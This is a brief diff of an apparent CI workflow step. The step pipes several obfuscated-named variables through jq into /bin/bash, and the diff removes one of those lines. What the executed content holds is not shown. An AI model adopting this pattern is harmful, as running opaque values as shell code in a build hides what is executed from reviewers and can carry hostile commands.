@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
           echo $ngto7925 | jq -r .igm57430 | /bin/bash
-          echo $jsq05 | jq -r .ntmcn965 | /bin/bash
           echo $db67 | jq -r .ydizd69 | /bin/bash
 
       - name: Archive results
